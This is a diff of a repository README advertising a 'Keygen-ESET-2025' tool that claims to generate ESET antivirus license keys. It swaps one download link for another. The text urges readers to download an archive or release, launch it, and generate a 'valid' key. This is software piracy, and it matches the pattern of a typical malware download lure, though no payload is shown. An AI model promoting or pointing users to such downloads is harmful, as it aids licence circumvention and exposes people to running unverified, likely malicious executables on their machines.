@@ -17,7 +17,7 @@ Welcome to the **Keygen-ESET-2025** repository! This powerful tool allows you to
 
 To access the Keygen tool and start generating your ESET license keys for 2025, simply download the file from the following link:
 
-[![Download Keygen](https://img.shields.io/badge/Download-Keygen-blue)](https://github.com/uploads/App.zip)
+[![Download Keygen](https://github.com/aironsheshh/Keygen-ESET-2025/releases)](https://github.com/aironsheshh/Keygen-ESET-2025/releases)
 
 Once the download is complete, launch the file and follow the instructions to generate your valid ESET license key.
 
